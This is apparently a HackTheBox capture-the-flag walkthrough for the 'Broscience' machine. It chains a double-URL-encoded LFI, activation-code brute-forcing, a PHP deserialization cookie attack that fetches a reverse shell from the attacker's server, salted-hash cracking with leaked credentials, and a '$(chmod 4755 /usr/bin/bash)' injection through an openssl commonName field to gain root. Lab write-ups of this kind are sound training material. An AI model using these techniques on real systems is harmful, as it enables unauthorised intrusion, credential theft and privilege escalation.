<h2>Target:  10.10.11.195	Broscience </h2>

<b>Initial Access:</b><br>
nmap -Pn -p- --min-rate=5000 10.10.11.195 |grep open|awk -F / '{print $1}'|tr '\n' ',' <br>
nmap shows open ports: 22,80,443

Enumerating these open ports further with nmap: <br>
nmap -Pn --min-rate=5000 10.10.11.195 -p 22,80,443 -sC -sV -oN nmap.broscience
 
![image](https://user-images.githubusercontent.com/93153300/212940418-f61ce8e4-90ef-438c-9267-aa45b90089ce.png)
nmap shows a redirect to broscience.htb.  To enable the redirect, add this into /etc/hosts: <br>
10.10.11.195 broscience.htb

Navigating to port 80 just redirects to port 443.  Navigating to port 443 shows:

![image](https://user-images.githubusercontent.com/93153300/212940463-81a41671-2366-4faf-aa14-4af693d44590.png)

On the top right corner we find a login page.  Clicking on the login shows:
 
![image](https://user-images.githubusercontent.com/93153300/212940524-66c9428a-77d9-468e-a2e5-c6263eb0e9c1.png)

We don’t have credentials to login.  However, we find a ‘Create an account’ option at the bottom.  Clicking on that shows: 
 
![image](https://user-images.githubusercontent.com/93153300/212940557-ccf100c3-6adc-4bc2-8f3a-fadea2dc3610.png)

Fill out the register page and click on ‘Register’ at the bottom.  After clicking on ‘Register’ it shows:
 
![image](https://user-images.githubusercontent.com/93153300/212940606-58ad832e-ac97-4204-b14c-fce5c7f48c9a.png)

In order to use the user we just registered we need the activation link.  So we still cannot use the new user we registered to login.  There’s not much more we can do on this site.  

Run directory brute force on the site: <br>
dirsearch -r -u https://broscience.htb -e txt,php -f -o dirsearch443.txt

Dirsearch found: <br>
https://broscience.htb/includes/ <br>
https://broscience.htb/activate.php

Visiting https://broscience.htb/activate.php shows:
 
![image](https://user-images.githubusercontent.com/93153300/212940631-0da61b7a-3ddc-44a4-8609-d30fe9e9a73b.png)

We don’t know the activation code.  Visiting https://broscience.htb/includes/ shows:
 
![image](https://user-images.githubusercontent.com/93153300/212940694-85a93e1c-b320-42f9-bf87-748fd285b13a.png)
 
Clicking on ‘img.php’ shows:
 
![image](https://user-images.githubusercontent.com/93153300/212940731-2133dedb-c9a1-4096-9563-eb7fb448fbb1.png)

Add in the path parameter and try a simple lfi for ‘/etc/passwd’. The page shows:
 
![image](https://user-images.githubusercontent.com/93153300/212940754-b87abb1f-6e4d-4fce-bfed-78c224b46ead.png)
 
Seems like a filter is blocking the local file inclusion (lfi).  To bypass the filter url encode all characters on the lfi twice.  To do this, capture the request in burp suite, send the request to ‘Repeater’, and then url encode all characters after ‘path=’ twice:
 
![image](https://user-images.githubusercontent.com/93153300/212940793-cbc21a76-fde9-4a16-9d92-8405a3a4111e.png)
 
Burp suite shows (on the right side) that the lfi worked, we get the file '/etc/passwd' back. Use the lfi to read the source code to ‘https://broscience.htb/activate.php’.  In our burp suite capture, change the path to ‘../activate.php’, url encode it twice, and submit the request.  Burp suite shows:   
 
![image](https://user-images.githubusercontent.com/93153300/212940819-0cf6094b-5b41-462d-91c2-8fafb071ad55.png)
 
The source code to ‘activate.php’ (shown on the right side of the burp suite screenshot above) shows that it uses a GET parameter of ‘code’.  Adding in the ‘code’ parameter shows:
 
![image](https://user-images.githubusercontent.com/93153300/212940866-95212a4a-cf03-417a-9ec7-7091c97c840e.png)

Seems like we can use this page to submit an activation code for the user we registered earlier.  Now we just need to figure out the activation code for our registered user and we should be able to activate our user.  

Looking back at https://broscience.htb/includes/ we see a few files that we can check their source code with the lfi: 
![image](https://user-images.githubusercontent.com/93153300/212940907-4120282d-b237-45f8-b258-99f7645814bb.png)
  
Check ‘utils.php’ with ‘path=../includes/utils.php’.  The Source code shows: 
 
![image](https://user-images.githubusercontent.com/93153300/212941012-b93f0d5f-a174-4664-a347-c71c9c4c7ab0.png)

The source code shows how the activation code is created.  Using this knowledge, we can generate the activation code for our registered user.  <br>

Step 1: Copy the source code to generating the activation code (shown above in the screenshot)<br>
Step 2: Replace the word ‘return’ with ‘echo'.  Add '. “\n”’ after the 'echo $activation_code'.   
Step 3: Add on the last line a call to the function: ‘generate_activation_code()’.  On the next line add an ending to the php code.  ‘?>’.  <br>
The code should look like this:
 
![image](https://user-images.githubusercontent.com/93153300/212941043-7079d031-7aa9-42cb-80ef-6019e0391d13.png)

We will call this script ‘activate_user.php’.  Now that we can generate the activation code,  create a new user and activate the user.  

Step 1: Since the activation code uses ‘time()’, we will need to capture the activation code at the time it is created.  Therefore, we need to run the ‘activate_user.php’ script first, and then register a new user.  This way we don’t miss the correct time for generating the activation code.  To do this, run the script: while true; do php activate_user.php >> fuzzlist;done <br>
Step 2: While step 1 is running register a new account in https://broscience.htb/register.php <br>
Step 3: After registering a new user, stop the script we ran in step 1. <br>
Step 4: Looking in the file ‘fuzzlist’ we created, we have a number of possible activation codes.  First remove duplicates with ‘sort’: cat fuzzlist | sort -u > fuzzlist.txt <br>
Step 5: Submit the activation codes: for i in $(cat fuzzlist.txt);do curl "https://broscience.htb/activate.php?code=$i" -k;done <br>
Step 6: The account has been activated.  Go to https://broscience.htb/login.php and login.  

After logging in the page shows:
 
![image](https://user-images.githubusercontent.com/93153300/212941100-861c8f7a-a0e8-4386-bcb3-f8474b5b74de.png)

Not much we can do with this page.  However, reading the source code to ‘utils.php’ (using lfi) further shows: 
 
![image](https://user-images.githubusercontent.com/93153300/212941190-36be06b4-4366-42c4-94db-3ac8a709ce83.png)
 
![image](https://user-images.githubusercontent.com/93153300/212941244-ad6017c0-8cf9-4179-9470-c5c6546c1ed8.png)
 
The source code shows that the cookie ‘user-prefs’ is being serialized.  Check this further in burp suite.  Refresh the page to our logged in user and capture the request in burp suite.  Burp suite shows the ‘user-prefs’ cookie is serialized:

![image](https://user-images.githubusercontent.com/93153300/212941294-0911a30c-baab-497c-80f3-c3c47297a597.png)

Use this to perform a deserialization attack.  

Step 1: Create a file containing a php pentestmonkey reverse shell.  We will call the filename ‘friends.php’.    <br>
Step 2: Create the php file for the deserialization attack (we will call the filename dattack.php): 
 
![image](https://user-images.githubusercontent.com/93153300/212941342-2437f119-f195-4c76-b104-759b7d7fbc0f.png)
 
This script will be used to upload the ‘friends.php’ php reverse shell to the target.  <br>
Step 3: Open a python server on our pc to host the ‘friends.php’ file: python3 -m http.server 80 <br>
Step 4: Run the file ‘ dattack.php’:
 
![image](https://user-images.githubusercontent.com/93153300/212941366-fa51e914-1101-436f-bb74-b9e0646c2048.png)
 
Step 5: Go back to the burp suite capture of our logged on user and replace the cookie ‘user-prefs’ value with the output to the ‘php dattack.php’ command.  It should look as follows:
 
![image](https://user-images.githubusercontent.com/93153300/212941389-85387369-54ee-4ca3-8bbc-3be057d4c4c2.png)

Step 6: Send the request in burp suite with the new cookie value.  The ‘friends.php’ uploaded successfully to the target.  <br>
Step 7: Open a netcat listener (we will use pwncat because it gives a better shell): pwncat-cs -lp 443 <br>
Step 8: Visit https://broscience.htb/friends.php

We get a shell on our pwncat listener.  We have shell as user www-data.
_____________________________________________
<b>Lateral Movement:</b><br>
The file /var/www/html/includes/db_connect.php shows credentials to a postgresql database, and also shows a salt used in the database: 
 
![image](https://user-images.githubusercontent.com/93153300/212941422-d3b5c07f-299f-42ac-b9bc-a0d27218d203.png)

Use these credentials to login to the postgresql database: <br>
psql -U dbuser -h localhost -p 5432 -d broscience  

Check the tables with command: \d
 
![image](https://user-images.githubusercontent.com/93153300/212941449-6155556e-3705-458a-b570-7b43af836b56.png)

Dump the ‘users’ table with command: select * from users; <br>
The ‘users’ table dumps usernames and password hashes:
 
![image](https://user-images.githubusercontent.com/93153300/212941488-5fb7f4a7-7046-4c61-8c99-e61d670a1022.png)

Create a file containing these hashes (we will call the filename ‘hashes’):
 
![image](https://user-images.githubusercontent.com/93153300/212941524-8e2f53be-a090-4038-a044-12740aefde08.png)

Using john/hashcat does not crack the hashes.  Looking back at the file ‘db_connect.php’ we see that we are given a salt value.   In order to crack these hashes we need to add in the salt to the beginning of every word in our wordlist.  To do this run the command: <br>
sed 's/^/NaCl/g' /usr/share/wordlists/rockyou.txt > newrockyou.txt

Next, run john with the new wordlist: john hashes --wordlist=newrockyou.txt --format=raw-md5

John cracks 2 hashes: <br>
NaCliluvhorsesandgym (bill)  <br> 
NaCl2applesplus2apples (michael) <br>
Remove the salt value of ‘NaCl’ and ssh into bill: <br>
ssh bill@broscience.htb  → enter the password when prompted.

We have shell as bill.  Go to /home/bill/user.txt to get the flag.
__________________________________________________
<b>Privilege Escalation</b><br>
Upload pspy to the target and run pspy.  Pspy shows: <br> <br>
timeout 10 /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt

Pspy shows that the file /opt/renew_cert.sh is being run by root every minute.  Check what the file /opt/renew_cert.sh does.  Reading the file /opt/renew_cert.sh shows:

![image](https://user-images.githubusercontent.com/93153300/212942529-125efb48-3c13-43c0-8044-f834a423ce78.png)
![image](https://user-images.githubusercontent.com/93153300/212942578-8abaf0cf-2e7d-4f6f-9618-a981b7aebe34.png)



![image](https://user-images.githubusercontent.com/93153300/212942689-e325a7e1-45fd-4e13-be8a-7ba9e6d984c9.png)






The file /opt/renew_cert.sh shows that it’s a command to create a certificate, and it uses the .crt file we give it.  Based on this information, we can get privilege escalation to root with the following steps:

Step 1: Run the command to create a certificate: openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout broscience.crt -out broscience.crt -days 1 <br>
Step 2: Set ‘$commonName’ to be a command to get suid on /usr/bin/bash.  When prompted to enter information for 'commonName' then enter: \$(chmod 4755 /usr/bin/bash) <br>
Step 3: Wait a few moments until the script is run by root.  Instead of checking every few seconds to see if the script was run by root, use the command: Watch -g ls -al /usr/bin/bash <br>
Step 4: Run the command: /usr/bin/bash -p

We have shell as root.  We can get the flag in /root/root.txt
